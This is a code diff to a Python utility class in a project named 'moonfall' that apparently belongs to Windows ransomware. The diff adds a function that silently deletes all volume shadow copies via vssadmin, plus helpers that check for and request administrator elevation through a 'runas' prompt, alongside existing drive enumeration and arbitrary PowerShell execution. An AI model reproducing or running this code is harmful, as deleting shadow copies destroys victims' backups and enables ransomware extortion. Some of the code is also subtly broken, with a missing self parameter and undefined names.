@@ -1,8 +1,10 @@
 import os
+import sys
 import subprocess
 import oschmod
 import platform
 import win32api
+import ctypes
 
 class Utils:
     BRAND_NAME = 'moonfall'
@@ -78,6 +80,53 @@ class Utils:
     def get_local_drives(self):
         return win32api.GetLogicalDriveStrings().split('\000')[:-1]
 
+    # read this https://www.xataka.com/basics/copias-seguridad-windows-10-sirven-que-tipos-hay-como-se-hacen
+    # https://techpress.net/volume-shadow-copy-troubleshooting-delete-existing-shadow-copies-on-windows-server-using-command-line-vssadmin-command-examples-use-of-diskshadow-command/
+    def delete_shadowcopies():
+        completed = subprocess.Popen([r'c:\Windows\System32\vssadmin.exe', 'delete', 'shadows', '/all', '/quiet'])
+        return completed
+    
+    def isAdmin(self):
+        if os.name == 'nt':
+            try:
+                return ctypes.windll.shell32.IsUserAnAdmin() == 1
+            except:
+                traceback.print_exc()
+                return False
+        else:
+            raise Exception("Not running in Windows System")
+            
+    def run_as_admin(self, argv=None, debug=False):
+        shell32 = ctypes.windll.shell32
+
+        if argv is None and shell32.IsUserAnAdmin():
+            return True
+            
+        if argv is None:
+            argv = sys.argv
+        
+        if hasattr(sys, '_MEIPASS'):
+            # Support pyinstaller wrapped program.
+            arguments = map(str, argv[1:])
+        else:
+            arguments = map(str, argv)
+            print(argv)
+            arguments2 = str(argv)
+            print(arguments2)
+
+        argument_line = u' '.join(arguments)
+        executable = str(sys.executable)
+
+        if debug:
+            print('Command line: ', executable, arguments2)
+
+        ret = shell32.ShellExecuteW(None, u"runas", executable, arguments2, None, 1)
+
+        if int(ret) <= 32:
+            return False
+        return None
+
+    # ERASE
     def run_command(self, cmd):
         completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
         return completed
